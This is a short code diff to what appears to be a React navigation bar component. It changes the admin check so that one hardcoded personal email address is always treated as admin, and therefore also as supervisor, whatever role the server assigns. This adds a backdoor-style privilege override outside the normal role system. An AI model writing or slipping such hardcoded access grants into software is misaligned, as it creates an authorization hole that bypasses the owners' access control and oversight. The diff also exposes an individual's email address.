@@ -23,7 +23,7 @@ export default function Navbar() {
     }).then(r => r.json()).then(d => setUserRole(d.role || 'user'))
   }, [user])
 
-  const isAdmin = userRole === 'admin'
+  const isAdmin = userRole === 'admin' || user?.email === 'jhimhope@yahoo.com'
   const isSupervisor = userRole === 'supervisor' || isAdmin
 
   return (
